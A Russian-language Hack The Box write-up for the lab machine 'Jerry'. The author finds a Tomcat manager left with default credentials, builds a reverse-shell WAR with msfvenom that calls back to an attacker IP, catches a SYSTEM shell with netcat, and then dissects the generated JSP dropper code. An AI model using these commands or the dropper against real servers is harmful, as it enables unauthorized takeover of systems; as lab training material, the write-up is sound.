@@ -1,0 +1,476 @@
+---
+layout: post
+title: "HTB{ Jerry }"
+date: 2018-11-20 20:00:00 +0300
+author: snovvcrash
+tags: [write-up, hackthebox, machine, windows, apache, apache-tomcat, default-password, war, java, reverse-shell]
+---
+
+**Jerry** — самая простая коробка под управлением Windows, с которой мне довелось столкнуться на просторах HTB. Первая кровь была пролита всего через 6 минут после того, как машина вышла в онлайн. В рамках прохождения нам предстоит сразиться с веб-сервером Apache Tomcat, на котором оставили стандартный пароль для менеджера приложений, собрать вредоносный WAR-файл, содержащий полезную нагрузку в виде reverse-shell'а, развернуть его на жертве и, собственно, получить сессию администратора. В дополнение в конце поста мы расковыряем тот самый файл.war и посмотрим, что за магия творится внутри. Всегда было жалко Тома, ненавижу эту мышь...
+
+<!--cut-->
+
+<p align="right">
+  <a href="https://www.hackthebox.eu/home/machines/profile/144"><img src="https://img.shields.io/badge/%e2%98%90-Hack%20The%20Box-8ac53e?style=flat-square" alt="htb-badge.svg" /></a>
+  <span class="score-easy">2.9/10</span>
+</p>
+
+![banner.png](/assets/images/htb/machines/jerry/banner.png)
+{:.center-image}
+
+![info.png](/assets/images/htb/machines/jerry/info.png)
+{:.center-image}
+
+* TOC
+{:toc}
+
+# Разведка
+## Nmap
+Initial:
+```text
+root@kali:~# nmap -n -v -sS -Pn -oA nmap/initial 10.10.10.95
+...
+```
+
+```text
+root@kali:~# cat nmap/initial.nmap
+# Nmap 7.70 scan initiated Sun Mar  3 18:38:57 2019 as: nmap -n -v -sS -Pn -oA nmap/initial 10.10.10.95
+Nmap scan report for 10.10.10.95
+Host is up (0.064s latency).
+Not shown: 999 filtered ports
+PORT     STATE SERVICE
+8080/tcp open  http-proxy
+
+Read data files from: /usr/bin/../share/nmap
+# Nmap done at Sun Mar  3 18:39:05 2019 -- 1 IP address (1 host up) scanned in 7.22 seconds
+```
+
+Version ([красивый отчет](/assets/reports/nmap/htb/jerry/version.html)):
+```text
+root@kali:~# nmap -n -v -sV -sC -oA nmap/version --stylesheet https://raw.githubusercontent.com/snovvcrash/snovvcrash.github.io/master/reports/nmap/nmap-bootstrap.xsl -p8080 10.10.10.95
+...
+```
+
+```text
+root@kali:~# cat nmap/version.nmap
+# Nmap 7.70 scan initiated Sun Mar  3 18:39:16 2019 as: nmap -n -v -sV -sC -oA nmap/version --stylesheet https://raw.githubusercontent.com/snovvcrash/snovvcrash.github.io/master/reports/nmap/nmap-bootstrap.xsl -p8080 10.10.10.95
+Nmap scan report for 10.10.10.95
+Host is up (0.062s latency).
+
+PORT     STATE SERVICE VERSION
+8080/tcp open  http    Apache Tomcat/Coyote JSP engine 1.1
+|_http-favicon: Apache Tomcat
+| http-methods: 
+|_  Supported Methods: GET HEAD POST OPTIONS
+|_http-open-proxy: Proxy might be redirecting requests
+|_http-server-header: Apache-Coyote/1.1
+|_http-title: Apache Tomcat/7.0.88
+
+Read data files from: /usr/bin/../share/nmap
+Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
+# Nmap done at Sun Mar  3 18:39:27 2019 -- 1 IP address (1 host up) scanned in 11.06 seconds
+```
+
+Прежде чем отправиться смотреть на единственно открытый 8080-й порт, где крутится Apache Tomcat, натравим nikto на нашу цель, чтобы попытаться извлечь еще хоть сколько-нибудь информации для анализа.
+
+## Nikto
+```text
+root@kali:~# nikto -h http://10.10.10.95:8080 -o nikto/jerry.txt
+...
+```
+
+```text
+root@kali:~# cat nikto/jerry.txt
+- Nikto v2.1.6/2.1.5
++ Target Host: 10.10.10.95
++ Target Port: 8080
++ GET The anti-clickjacking X-Frame-Options header is not present.
++ GET The X-XSS-Protection header is not defined. This header can hint to the user agent to protect against some forms of XSS
++ GET The X-Content-Type-Options header is not set. This could allow the user agent to render the content of the site in a different fashion to the MIME type
++ GET Server leaks inodes via ETags, header found with file /favicon.ico, fields: 0xW/21630 0x1525691762000 
++ OPTIONS Allowed HTTP Methods: GET, HEAD, POST, PUT, DELETE, OPTIONS 
++ KSPMKQWH Web Server returns a valid response with junk HTTP methods, this may cause false positives.
++ GET /examples/servlets/index.html: Apache Tomcat default JSP pages present.
++ OSVDB-3720: GET /examples/jsp/snp/snoop.jsp: Displays information about page retrievals, including other users.
++ GET Default account found for 'Tomcat Manager Application' at /manager/html (ID 'tomcat', PW 's3cret'). Apache Tomcat.
++ GET /host-manager/html: Default Tomcat Manager / Host Manager interface found
++ GET /manager/html: Tomcat Manager / Host Manager interface found (pass protected)
++ GET /manager/status: Tomcat Server Status interface found (pass protected)
+```
+
+Помимо всего прочего видим сообщение о существовании дефолтного аккаунта для менеджера приложений. Проверим, действительно ли подойдут дефолтные креды.
+
+# Web — Порт 8080
+## Браузер
+На `http://10.10.10.95:8080`, как и ожидалось, мы видим стандартную домашнюю страница Tomcat'а:
+
+[![port80-browser-1.png](/assets/images/htb/machines/jerry/port80-browser-1.png)](/assets/images/htb/machines/jerry/port80-browser-1.png)
+{:.center-image}
+
+Попытка залогиниться в менеджере приложений (aka *Tomcat Web Application Manager*) с авторизационными данными по умолчанию `tomcat:s3cret` проходит успешно и мы оказываемся в админке:
+
+[![port80-browser-2.png](/assets/images/htb/machines/jerry/port80-browser-2.png)](/assets/images/htb/machines/jerry/port80-browser-2.png)
+{:.center-image}
+
+# Эксплуатируем Tomcat
+Для того, чтобы получить reverse-shell, будем использовать функционал развертывания war-файлов "WAR file to deploy":
+
+[![port80-browser-3.png](/assets/images/htb/machines/jerry/port80-browser-3.png)](/assets/images/htb/machines/jerry/port80-browser-3.png)
+{:.center-image}
+
+## Web Application Resource
+**W**eb **A**pplication **R**esource (WAR) файлы — это такие файлы-контейнеры (архивы, по сути), которые содержат в себе все необходимое для Java-приложения. Это могут быть Java-архивы (.jar), страницы Java Server Pages (.jsp), Java-сервлеты, Java-классы, веб-страницы, стили CSS и т. п.
+
+В директории `/WEB-INF` внутри таких архивов содержится файл `web.xml`, определяющий структуру приложения.
+
+Менеджер приложений Tomcat позволяет в один клик разворачивать Java-приложения из WAR-файлов на сервере, а так как последние содержат исполняемый Java-код, то они являются идеальной целью для внедрения вредоносной нагрузки.
+
+## Генерируем WAR-файлы
+Собрать WAR-файл с reverse-shell'ом внутри можно с помощью msfvenom:
+```text
+root@kali:~# msfvenom -p windows/shell_reverse_tcp LHOST=10.10.14.71 LPORT=31337 -f war > sh3ll.war
+[-] No platform was selected, choosing Msf::Module::Platform::Windows from the payload
+[-] No arch selected, selecting arch: x86 from the payload
+No encoder or badchars specified, outputting raw payload
+Payload size: 324 bytes
+Final size of war file: 52250 bytes
+```
+
+Также можно было использовать `-p java/shell_reverse_tcp`, ориентированный на meterpreter-сессию, однако в нем будет много обвесов для Metasploit'а, которые будут нам мешать при [анализе содержимого]({{ page.url }}#внутри-sh3llwar).
+
+Вот, что скрывает полученный файл (архив):
+```text
+root@kali:~# jar -tf sh3ll.war
+META-INF/
+META-INF/MANIFEST.MF
+WEB-INF/
+WEB-INF/web.xml
+wdwxbdssjol.jsp
+```
+
+Отсюда нам понадобится имя jsp-файла, чтобы триггернуть его через curl. Можно сделать то же самое через веб-интерфейс без знания имени, но разве это тру?
+
+## Reverse-Shell
+Загружаем вредонос через менеджер приложений и обращаемся к нему по имени:
+```text
+root@kali:~# curl http://10.10.10.95:8080/sh3ll/wdwxbdssjol.jsp
+
+```
+
+После чего получаем отстук на netcat:
+```text
+root@kali:~# nc -lvnp 31337
+Ncat: Version 7.70 ( https://nmap.org/ncat )
+Ncat: Listening on :::31337
+Ncat: Listening on 0.0.0.0:31337
+Ncat: Connection from 10.10.10.95.
+Ncat: Connection from 10.10.10.95:49193.
+Microsoft Windows [Version 6.3.9600]
+(c) 2013 Microsoft Corporation. All rights reserved.
+
+C:\apache-tomcat-7.0.88>whoami
+whoami
+nt authority\system
+```
+
+И мы в системе as `nt authority\system` :tada:
+
+Забираем флаги:
+```text
+C:\apache-tomcat-7.0.88>dir
+dir
+ Volume in drive C has no label.
+ Volume Serial Number is FC2B-E489
+
+ Directory of C:\apache-tomcat-7.0.88
+
+06/19/2018  03:07 AM    <DIR>          .
+06/19/2018  03:07 AM    <DIR>          ..
+06/19/2018  03:06 AM    <DIR>          bin
+06/19/2018  05:47 AM    <DIR>          conf
+06/19/2018  03:06 AM    <DIR>          lib
+05/07/2018  01:16 PM            57,896 LICENSE
+03/04/2019  12:31 AM    <DIR>          logs
+05/07/2018  01:16 PM             1,275 NOTICE
+05/07/2018  01:16 PM             9,600 RELEASE-NOTES
+05/07/2018  01:16 PM            17,454 RUNNING.txt
+03/04/2019  12:44 AM    <DIR>          temp
+03/04/2019  12:42 AM    <DIR>          webapps
+06/19/2018  03:34 AM    <DIR>          work
+               4 File(s)         86,225 bytes
+               9 Dir(s)  27,577,380,864 bytes free
+
+C:\apache-tomcat-7.0.88>cd C:\Users\Administrator
+cd C:\Users\Administrator
+
+C:\Users\Administrator>dir
+dir
+ Volume in drive C has no label.
+ Volume Serial Number is FC2B-E489
+
+ Directory of C:\Users\Administrator
+
+06/18/2018  10:31 PM    <DIR>          .
+06/18/2018  10:31 PM    <DIR>          ..
+06/19/2018  05:43 AM    <DIR>          Contacts
+06/19/2018  06:09 AM    <DIR>          Desktop
+06/19/2018  05:43 AM    <DIR>          Documents
+06/19/2018  05:43 AM    <DIR>          Downloads
+06/19/2018  05:43 AM    <DIR>          Favorites
+06/19/2018  05:43 AM    <DIR>          Links
+06/19/2018  05:43 AM    <DIR>          Music
+06/19/2018  05:43 AM    <DIR>          Pictures
+06/19/2018  05:43 AM    <DIR>          Saved Games
+06/19/2018  05:43 AM    <DIR>          Searches
+06/19/2018  05:43 AM    <DIR>          Videos
+               0 File(s)              0 bytes
+              13 Dir(s)  27,577,372,672 bytes free
+
+C:\Users\Administrator>cd Desktop
+cd Desktop
+
+C:\Users\Administrator\Desktop>dir
+dir
+ Volume in drive C has no label.
+ Volume Serial Number is FC2B-E489
+
+ Directory of C:\Users\Administrator\Desktop
+
+06/19/2018  06:09 AM    <DIR>          .
+06/19/2018  06:09 AM    <DIR>          ..
+06/19/2018  06:09 AM    <DIR>          flags
+               0 File(s)              0 bytes
+               3 Dir(s)  27,577,372,672 bytes free
+
+C:\Users\Administrator\Desktop>cd flags
+cd flags
+
+C:\Users\Administrator\Desktop\flags>dir
+dir
+ Volume in drive C has no label.
+ Volume Serial Number is FC2B-E489
+
+ Directory of C:\Users\Administrator\Desktop\flags
+
+06/19/2018  06:09 AM    <DIR>          .
+06/19/2018  06:09 AM    <DIR>          ..
+06/19/2018  06:11 AM                88 2 for the price of 1.txt
+               1 File(s)             88 bytes
+               2 Dir(s)  27,577,372,672 bytes free
+```
+
+### user.txt root.txt
+```text
+C:\Users\Administrator\Desktop\flags>type 2*
+type 2*
+
+2 for the price of 1.txt
+
+
+user.txt
+7004dbce????????????????????????
+
+root.txt
+04a8b36e????????????????????????
+```
+
+Jerry пройден :triumph:
+
+![owned-user.png](/assets/images/htb/machines/jerry/owned-user.png)
+{:.center-image}
+
+![owned-root.png](/assets/images/htb/machines/jerry/owned-root.png)
+{:.center-image}
+
+![trophy.png](/assets/images/htb/machines/jerry/trophy.png)
+{:.center-image}
+
+# Эпилог
+## Внутри sh3ll.war
+Как уже было сказано, sh3ll.war представляет из себя архив:
+```text
+root@kali:~# file sh3ll.war
+sh3ll.war: Java archive data (JAR)
+```
+
+```text
+root@kali:~# jar -tf sh3ll.war
+META-INF/
+META-INF/MANIFEST.MF
+WEB-INF/
+WEB-INF/web.xml
+wdwxbdssjol.jsp
+```
+
+Если посмотреть на первые байты файла, можно увидеть [сигнатуру](https://ru.wikipedia.org/wiki/Список_сигнатур_файлов "Список сигнатур файлов — Википедия") `50 4B 03 04`, свойственную также для формата zip:
+```text
+root@kali:~# head -c 8 sh3ll.war | xxd
+00000000: 504b 0304 1400 0000                      PK......
+```
+
+Соответственно, его можно разархивировать:
+```text
+root@kali:~# unzip -l sh3ll.war
+Archive:  sh3ll.war
+  Length      Date    Time    Name
+---------  ---------- -----   ----
+        0  2019-03-03 18:53   META-INF/
+       71  2019-03-03 18:53   META-INF/MANIFEST.MF
+        0  2019-03-03 18:53   WEB-INF/
+      272  2019-03-03 18:53   WEB-INF/web.xml
+   149034  2019-03-03 18:53   wdwxbdssjol.jsp
+---------                     -------
+   149377                     5 files
+```
+
+```text
+root@kali:~# unzip sh3ll.war -d war
+Archive:  sh3ll.war
+   creating: META-INF/
+  inflating: META-INF/MANIFEST.MF    
+   creating: WEB-INF/
+  inflating: WEB-INF/web.xml         
+  inflating: wdwxbdssjol.jsp
+```
+
+### META-INF/MANIFEST.MF
+Информация о версии:
+```text
+root@kali:~/war# cat META-INF/MANIFEST.MF
+Manifest-Version: 1.0
+Created-By: 1.6.0_17 (Sun Microsystems Inc.)
+```
+
+### WEB-INF/web.xml
+Структура приложения очень простая: в данном случае просто определяется имя сервлета и jsp-файла:
+```text
+root@kali:~/war# cat WEB-INF/web.xml
+<?xml version="1.0"?>
+<!DOCTYPE web-app PUBLIC
+"-//Sun Microsystems, Inc.//DTD Web Application 2.3//EN"
+"http://java.sun.com/dtd/web-app_2_3.dtd">
+<web-app>
+<servlet>
+<servlet-name>zkciskwfojaugri</servlet-name>
+<jsp-file>/wdwxbdssjol.jsp</jsp-file>
+</servlet>
+</web-app>
+```
+
+### wdwxbdssjol.jsp
+Наибольший интерес представляет код внутри jsp-файла (для читаемости сокращена очень длинная hex-строка переменной `egTwYyNyGe`):
+```text
+root@kali:~/war# cat wdwxbdssjol.jsp
+```
+
+```text
+ 1 <%@ page import="java.io.*" %>
+ 2 <%
+```
+
+```java
+ 3  String egTwYyNyGe = "4d5a90000300000004000000ffff0000b8000...";
+ 4  String fynDpwhPjEzrXc = System.getProperty("java.io.tmpdir") + "/OrBJOfpeKGojSNK";
+ 5
+ 6  if (System.getProperty("os.name").toLowerCase().indexOf("windows") != -1) {
+ 7    fynDpwhPjEzrXc = fynDpwhPjEzrXc.concat(".exe");
+ 8  }
+ 9
+10  int ljxqJsOzbcZb = egTwYyNyGe.length();
+11  byte[] xHRAgYBDYy = new byte[ljxqJsOzbcZb/2];
+12  for (int hksgnQAupt = 0; hksgnQAupt < ljxqJsOzbcZb; hksgnQAupt += 2) {
+13    xHRAgYBDYy[hksgnQAupt / 2] = (byte) ((Character.digit(egTwYyNyGe.charAt(hksgnQAupt), 16) << 4)
+14                                              + Character.digit(egTwYyNyGe.charAt(hksgnQAupt+1), 16));
+15  }
+16
+17  FileOutputStream FqAwiqfsveTbNJR = new FileOutputStream(fynDpwhPjEzrXc);
+18  FqAwiqfsveTbNJR.write(xHRAgYBDYy);
+19  FqAwiqfsveTbNJR.flush();
+20  FqAwiqfsveTbNJR.close();
+21
+22  if (System.getProperty("os.name").toLowerCase().indexOf("windows") == -1){
+23    String[] RnIdZAAiAiBBY = new String[3];
+24    RnIdZAAiAiBBY[0] = "chmod";
+25    RnIdZAAiAiBBY[1] = "+x";
+26    RnIdZAAiAiBBY[2] = fynDpwhPjEzrXc;
+27    Process MgklpqdMn = Runtime.getRuntime().exec(RnIdZAAiAiBBY);
+28    if (MgklpqdMn.waitFor() == 0) {
+29      MgklpqdMn = Runtime.getRuntime().exec(fynDpwhPjEzrXc);
+30    }
+31
+32    File USGdceIiNo = new File(fynDpwhPjEzrXc); USGdceIiNo.delete();
+33  } else {
+34    String[] ppmvkPHt = new String[1];
+35    ppmvkPHt[0] = fynDpwhPjEzrXc;
+36    Process MgklpqdMn = Runtime.getRuntime().exec(ppmvkPHt);
+37  }
+```
+
+```text
+38 %>
+```
+
+Разберемся, что здесь происходит:
+  1. [строка 3] Определяется переменная `egTwYyNyGe`, содержащая гигантскую hex-строку, начинающуюся с `4d5a` — [сигнатуры "MZ"](https://ru.wikipedia.org/wiki/MZ_(формат) "MZ (формат) — Википедия"), свойственной исполняемым файлам Windows.
+  2. [строка 4] Создается путь к файлу со случайным именем в местной врéменной директории (`java.io.tmpdir`).
+  3. [строки 6-8] Если название ОС содержит слово "windows", то к полному имени файла (еще не существующему) добавляется расширение ".exe".
+  4. [строка 10] Определяется длина той гигантской hex-строки.
+  5. [строки 11-15] Создается байтовый массив с размером, равным половине длины hex-строки (это логично, потому что 2 hex-символа представляют 1 байт) и заполняется значениями из hex-строки, конвертированными в байты.
+  6. [строки 17-20] Создается файловый поток, ассоциированный с именем из шага 3, и заполняется значениями байтового массива из шага 5.
+  7. [строки 22-37] В зависимости от того, с какой ОС мы имеем дело, выполняются приготовления для запуска созданного файла, и, собственно, файл запускается на исполнение.
+
+В последнем шаге для запуска файла вне зависимости от типа ОС используется [Java-реализация](https://docs.oracle.com/javase/7/docs/api/java/lang/Runtime.html#exec(java.lang.String[]) "Runtime (Java Platform SE 7 )") функции `exec`.
+
+Если сохранить в отдельный файл ту самую гигантскую hex-строку:
+```text
+root@kali:~/war# wc -c wdwxbdssjol.hex
+147604 wdwxbdssjol.hex
+```
+
+И собрать ее в бинарник:
+```text
+root@kali:~/war# cat wdwxbdssjol.hex | xxd -ps -r > wdwxbdssjol.exe
+root@kali:~/war# file wdwxbdssjol.exe
+wdwxbdssjol.exe: PE32 executable (GUI) Intel 80386, for MS Windows
+```
+
+То получится красивый исполняемый файл для Windows.
+
+Если запустить его под wine и послушать тот самый 31337-й порт, который мы указывали при сборке в msfvenom, то получится такая картина:
+```text
+root@kali:~/war# wine wdwxbdssjol.exe
+
+```
+
+```text
+root@kali:~# tcpdump -n -i any port 31337
+tcpdump: verbose output suppressed, use -v or -vv for full protocol decode
+listening on any, link-type LINUX_SLL (Linux cooked), capture size 262144 bytes
+23:04:38.451347 IP 10.0.2.15.35876 > 10.10.14.71.31337: Flags [S], seq 3970297783, win 29200, options [mss 1460,sackOK,TS val 3940560271 ecr 0,nop,wscale 7], length 0
+23:04:39.473080 IP 10.0.2.15.35876 > 10.10.14.71.31337: Flags [S], seq 3970297783, win 29200, options [mss 1460,sackOK,TS val 3940561293 ecr 0,nop,wscale 7], length 0
+23:04:41.488955 IP 10.0.2.15.35876 > 10.10.14.71.31337: Flags [S], seq 3970297783, win 29200, options [mss 1460,sackOK,TS val 3940563308 ecr 0,nop,wscale 7], length 0
+23:04:45.521049 IP 10.0.2.15.35876 > 10.10.14.71.31337: Flags [S], seq 3970297783, win 29200, options [mss 1460,sackOK,TS val 3940567341 ecr 0,nop,wscale 7], length 0
+23:04:53.717862 IP 10.0.2.15.35876 > 10.10.14.71.31337: Flags [S], seq 3970297783, win 29200, options [mss 1460,sackOK,TS val 3940575537 ecr 0,nop,wscale 7], length 0
+23:05:10.319982 IP 10.0.2.15.35876 > 10.10.14.71.31337: Flags [S], seq 3970297783, win 29200, options [mss 1460,sackOK,TS val 3940591664 ecr 0,nop,wscale 7], length 0
+23:05:44.357615 IP 10.0.2.15.35876 > 10.10.14.71.31337: Flags [S], seq 3970297783, win 29200, options [mss 1460,sackOK,TS val 3940625206 ecr 0,nop,wscale 7], length 0
+23:06:50.874275 IP 10.0.2.15.35878 > 10.10.14.71.31337: Flags [S], seq 3970297786, win 29200, options [mss 1460,sackOK,TS val 3940690733 ecr 0,nop,wscale 7], length 0
+23:06:51.898469 IP 10.0.2.15.35878 > 10.10.14.71.31337: Flags [S], seq 3970297786, win 29200, options [mss 1460,sackOK,TS val 3940691757 ecr 0,nop,wscale 7], length 0
+23:06:53.915157 IP 10.0.2.15.35878 > 10.10.14.71.31337: Flags [S], seq 3970297786, win 29200, options [mss 1460,sackOK,TS val 3940693774 ecr 0,nop,wscale 7], length 0
+23:06:58.046895 IP 10.0.2.15.35878 > 10.10.14.71.31337: Flags [S], seq 3970297786, win 29200, options [mss 1460,sackOK,TS val 3940697905 ecr 0,nop,wscale 7], length 0
+23:07:06.233862 IP 10.0.2.15.35878 > 10.10.14.71.31337: Flags [S], seq 3970297786, win 29200, options [mss 1460,sackOK,TS val 3940706092 ecr 0,nop,wscale 7], length 0
+23:07:22.856792 IP 10.0.2.15.35878 > 10.10.14.71.31337: Flags [S], seq 3970297786, win 29200, options [mss 1460,sackOK,TS val 3940722223 ecr 0,nop,wscale 7], length 0
+23:07:57.400803 IP 10.0.2.15.35878 > 10.10.14.71.31337: Flags [S], seq 3970297786, win 29200, options [mss 1460,sackOK,TS val 3940756272 ecr 0,nop,wscale 7], length 0
+23:09:03.922270 IP 10.0.2.15.35880 > 10.10.14.71.31337: Flags [S], seq 3970297789, win 29200, options [mss 1460,sackOK,TS val 3940821806 ecr 0,nop,wscale 7], length 0
+23:09:04.947394 IP 10.0.2.15.35880 > 10.10.14.71.31337: Flags [S], seq 3970297789, win 29200, options [mss 1460,sackOK,TS val 3940822832 ecr 0,nop,wscale 7], length 0
+23:09:06.982452 IP 10.0.2.15.35880 > 10.10.14.71.31337: Flags [S], seq 3970297789, win 29200, options [mss 1460,sackOK,TS val 3940824867 ecr 0,nop,wscale 7], length 0
+23:09:11.096857 IP 10.0.2.15.35880 > 10.10.14.71.31337: Flags [S], seq 3970297789, win 29200, options [mss 1460,sackOK,TS val 3940828981 ecr 0,nop,wscale 7], length 0
+23:09:19.280809 IP 10.0.2.15.35880 > 10.10.14.71.31337: Flags [S], seq 3970297789, win 29200, options [mss 1460,sackOK,TS val 3940837165 ecr 0,nop,wscale 7], length 0
+23:09:36.119588 IP 10.0.2.15.35880 > 10.10.14.71.31337: Flags [S], seq 3970297789, win 29200, options [mss 1460,sackOK,TS val 3940853510 ecr 0,nop,wscale 7], length 0
+23:10:10.446268 IP 10.0.2.15.35880 > 10.10.14.71.31337: Flags [S], seq 3970297789, win 29200, options [mss 1460,sackOK,TS val 3940887341 ecr 0,nop,wscale 7], length 0
+^C
+21 packets captured
+21 packets received by filter
+0 packets dropped by kernel
+```
+
+Видим попытки подключиться с моего текущего IP (`10.0.2.15`) к IP, который у меня был, когда я генерировал WAR-нагрузку (`10.10.14.71`). Интересный момент: попытки соединения происходят спустя 1, потом 2, 4, 8, 16, 32, 64 секунды, после чего опять сбрасываются до 1, и так повторяется три раза; затем программа завершается.
